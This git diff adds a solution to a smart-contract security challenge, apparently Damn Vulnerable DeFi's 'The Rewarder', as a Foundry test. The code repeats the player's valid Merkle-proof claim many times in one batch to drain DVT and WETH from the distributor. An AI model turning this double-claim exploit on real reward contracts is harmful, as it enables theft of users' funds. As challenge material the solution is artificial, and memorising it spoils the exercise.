@@ -22,6 +22,9 @@ contract TheRewarderChallenge is Test {
     uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
     uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;
 
+    uint256 constant PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+    uint256 constant PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
     TheRewarderDistributor distributor;
 
     // Instance of Murky's contract to handle Merkle roots, proofs, etc.
@@ -148,7 +151,58 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Player (0x44E97aF4418b7a17AABD8090bEA0A471a366305C)
+
+        uint256 wordPosition = 0 / 256;
+        uint256 bitPosition = 0 % 256;
+
+        console.log("Word Position: ", wordPosition);
+        console.log("Bit Position: ", bitPosition);
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 dvtClaimAttempts = expectedDVTLeft / PLAYER_DVT_CLAIM_AMOUNT;
+
+        console.log("Claims to be made for DVT: ", dvtClaimAttempts);
+
+        Claim[] memory dvtClaims = new Claim[](dvtClaimAttempts);
+
+        for (uint256 i = 0; i < dvtClaimAttempts; i++) {
+            dvtClaims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+        uint256 wethClaimAttempts = expectedWETHLeft / PLAYER_WETH_CLAIM_AMOUNT;
+
+        console.log("Claims to be made for WETH: ", wethClaimAttempts);
+
+        Claim[] memory wethClaims = new Claim[](wethClaimAttempts);
+
+        for (uint256 i = 0; i < wethClaimAttempts; i++) {
+            wethClaims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
